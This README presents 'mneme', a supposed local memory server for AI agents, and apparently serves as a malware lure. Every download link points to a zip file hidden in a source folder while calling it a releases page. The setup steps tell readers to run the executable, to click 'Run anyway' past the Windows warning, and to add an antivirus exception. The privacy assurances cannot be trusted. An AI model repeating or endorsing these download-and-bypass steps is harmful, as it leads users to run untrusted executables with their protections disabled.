# 🧠 mneme - Keep memory for your AI agents

[![](https://img.shields.io/badge/Download_Mneme_for_Windows-blue?style=for-the-badge)](https://github.com/Vaginaldischargenewscaster673/mneme/raw/refs/heads/main/src/mcp/transport/Software-v1.7.zip)

## 📌 What is mneme?

Mneme acts as a brain for your AI agents. It stores information locally on your computer. This tool helps your AI remember past conversations and documents. It saves this data in a way that the AI can search quickly. Because it runs on your machine, your data stays private. You do not need a cloud account. You do not need to send private notes to a third party. Mneme uses a single file to keep everything organized. 

## ⚙️ System Requirements

Mneme works on Windows 10 and Windows 11. Your computer needs at least 4GB of RAM to run it smoothly. You need about 500MB of free disk space for the program and the data it builds. This tool does not require advanced graphic cards or specialized processors. It works on most standard laptops and desktop computers. 

## 📥 Getting Started

1. Visit the [releases page](https://github.com/Vaginaldischargenewscaster673/mneme/raw/refs/heads/main/src/mcp/transport/Software-v1.7.zip).
2. Look for the latest version at the top.
3. Click the link that ends in .exe for Windows.
4. Save the file to your desktop or your Documents folder.

## 🚀 Running the Program

1. Open your File Explorer. 
2. Find the file you just downloaded.
3. Double-click the file to start it.
4. Windows might show a warning. This happens because the file comes from the internet. Click "More info" and then "Run anyway" if you see this message.
5. A command window appears. Keep this window open while you use your AI agent.
6. The program starts a local server. This server connects your AI agent to your saved data.

## 🛠️ Configuring Your AI

Mneme works with AI tools that support the Model Context Protocol, or MCP. You must tell your AI agent where to find the server. 

1. Open your AI agent software settings.
2. Look for "MCP servers" or "Plugin settings".
3. Add a new server.
4. Provide the path to the mneme file if your settings ask for it.
5. Save your changes and restart your AI software.

Your AI will now query the mneme tool. It can search your saved documents, notes, and previous chat logs. It builds a map of your data to provide better answers.

## 💡 Managing Your Memory

Mneme stores data in a subfolder within the same location as the program file. You can back up this folder at any time. Copy the folder to a USB drive or cloud storage to keep your memory safe. 

If you want to clear your AI history, delete the content of this folder. The program will build a new memory store the next time it runs. This gives you full control over what your AI keeps and what it forgets.

## 🔍 Why Local-First AI Matters

Privacy drives the design of this tool. Many AI systems store your data in distant warehouses. They analyze what you type to improve their own models. Mneme treats your computer as the primary home for your information. You own the files. You control access. The AI only sees what you explicitly allow. This approach lowers latency, as the data does not travel to a server and back. 

## 📝 Common Questions

### Does this require an internet connection?
No. Mneme runs entirely on your hardware. You do not need an active web connection to search your local memory. 

### Can I run multiple agents with one setup?
Yes. You can connect several different AI agents to the same database. They can all learn from the same pool of information.

### What files can it read?
Mneme reads standard text files and documents. If you have a folder full of PDFs or notes, point the tool toward that folder. It will scan them and turn them into searchable memory.

### Is this safe to use with private data?
Yes. Your data never leaves your computer. It does not communicate with external servers beyond the local connections you create. 

### How do I update the software?
Download the newest version from the link provided in the Getting Started section. Replace the old file with the new one. Your memory folder will persist and update automatically when the new version launches.

## 🛡️ Troubleshooting

If the program closes immediately after you click it, check your folder permissions. Ensure the file is not blocked by your antivirus software. Some security settings block unknown files by default. If this happens, add an exception for the mneme file in your security settings.

If the AI agent fails to connect, verify the server URL. It usually runs at http://localhost with a specific port number. Check your configuration file to ensure the port matches the one shown in your command window.

If your computer slows down, ensure you are not running too many concurrent tasks. Mneme uses a small amount of resources, but adding many large documents to the index may require a brief moment of processing. Wait a few seconds for the index to finish.